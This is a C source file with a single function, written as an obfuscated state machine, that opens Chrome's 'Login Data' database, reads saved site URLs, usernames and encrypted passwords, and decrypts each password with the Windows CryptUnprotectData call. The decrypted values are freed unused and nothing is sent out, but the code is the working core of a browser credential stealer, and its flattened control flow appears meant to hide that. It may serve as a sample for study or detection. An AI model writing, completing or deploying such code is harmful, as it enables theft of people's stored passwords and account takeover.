#include <windows.h>
#include <wincrypt.h>

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
int sqlite3_open(const char *, sqlite3 **);
int sqlite3_prepare_v2(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
int sqlite3_step(sqlite3_stmt *);
int sqlite3_column_bytes(sqlite3_stmt *, int);
const void *sqlite3_column_blob(sqlite3_stmt *, int);
const unsigned char *sqlite3_column_text(sqlite3_stmt *, int);
int sqlite3_finalize(sqlite3_stmt *);
int sqlite3_close(sqlite3 *);

void __attribute__((noinline)) __attribute__((used)) routine_v5()
{
    int state = 0;
    char db_path[260];
    sqlite3 *db = 0;
    sqlite3_stmt *stmt = 0;
    DATA_BLOB in, out;
    while (state != -1)
    {
        switch (state)
        {
        case 0:
            ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data", db_path, 260);
            state = 1;
            break;
        case 1:
            sqlite3_open(db_path, &db);
            state = 2;
            break;
        case 2:
            sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0);
            state = 3;
            break;
        case 3:
            if (sqlite3_step(stmt) == 100)
            {
                state = 4;
            }
            else
            {
                state = 8;
            }
            break;
        case 4:
            in.cbData = (DWORD)sqlite3_column_bytes(stmt, 2);
            in.pbData = (BYTE *)sqlite3_column_blob(stmt, 2);
            state = 5;
            break;
        case 5:
            if (CryptUnprotectData(&in, 0, 0, 0, 0, 0, &out))
            {
                state = 6;
            }
            else
            {
                state = 7;
            }
            break;
        case 6:
            LocalFree(out.pbData);
            state = 7;
            break;
        case 7:
            state = 3;
            break;
        case 8:
            sqlite3_finalize(stmt);
            state = 9;
            break;
        case 9:
            sqlite3_close(db);
            state = -1;
            break;
        }
    }
}